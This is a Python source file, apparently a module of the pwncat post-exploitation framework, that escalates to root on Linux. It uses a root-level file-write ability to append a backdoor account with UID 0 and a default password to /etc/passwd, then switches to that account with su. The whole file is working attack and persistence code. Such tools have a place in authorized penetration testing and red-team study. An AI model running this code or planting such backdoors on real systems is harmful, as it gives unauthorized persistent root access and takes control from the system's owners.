#!/usr/bin/env python3
import crypt

import pwncat
from pwncat.util import console
from pwncat.facts import EscalationReplace
from pwncat.modules import ModuleFailed
from pwncat.platform.linux import Linux
from pwncat.modules.enumerate import Schedule, EnumerateModule
from pwncat.modules.linux.implant.passwd import PasswdImplant


class AppendPasswd(EscalationReplace):
    """Escalation through adding a new user to /etc/passwd"""

    def __init__(self, source, ability):
        super().__init__(source=source, source_uid=ability.source_uid, uid=ability.uid)

        self.ability = ability

    def escalate(self, session: "pwncat.manager.Session"):

        try:
            with session.platform.open("/etc/passwd", "r") as filp:
                passwd_contents = list(filp)
        except (FileNotFoundError, PermissionError):
            raise ModuleFailed("failed to read /etc/passwd")

        backdoor_user = session.config.get("backdoor_user", "pwncat")
        backdoor_pass = session.config.get("backdoor_pass", "pwncat")
        shell = session.platform.getenv("SHELL")

        # Hash the backdoor password
        backdoor_hash = crypt.crypt(backdoor_pass, crypt.METHOD_SHA512)

        if not any(line.startswith(f"{backdoor_user}:") for line in passwd_contents):

            # Add our password
            "".join(passwd_contents)
            new_line = f"""{backdoor_user}:{backdoor_hash}:0:0::/root:{shell}\n"""
            passwd_contents.append(new_line)

            try:
                # Write the modified password entry back
                with self.ability.open(session, "/etc/passwd", "w") as filp:
                    filp.writelines(passwd_contents)

                # Ensure we track the tampered file
                session.register_fact(
                    PasswdImplant(
                        "linux.implant.passwd",
                        backdoor_user,
                        backdoor_pass,
                        new_line,
                    )
                )
            except (FileNotFoundError, PermissionError):
                raise ModuleFailed("failed to write /etc/passwd")

        else:
            console.log(
                f"[cyan]{backdoor_user}[/cyan] already exists; attempting authentication"
            )

        try:
            session.platform.su(backdoor_user, password=backdoor_pass)
            return lambda session: session.platform.channel.send(b"exit\n")
        except PermissionError:
            raise ModuleFailed("added user, but switch user failed")

    def title(self, session: "pwncat.manager.Session"):
        return f"""add user using {self.ability.title(session)}"""


class Module(EnumerateModule):
    """Check for possible methods of escalation via modifying /etc/passwd"""

    PROVIDES = ["escalate.replace"]
    SCHEDULE = Schedule.PER_USER
    PLATFORM = [Linux]

    def enumerate(self, session):

        for ability in session.run("enumerate.gather", types=["ability.file.write"]):
            if ability.uid != 0:
                continue

            yield AppendPasswd(self.name, ability)
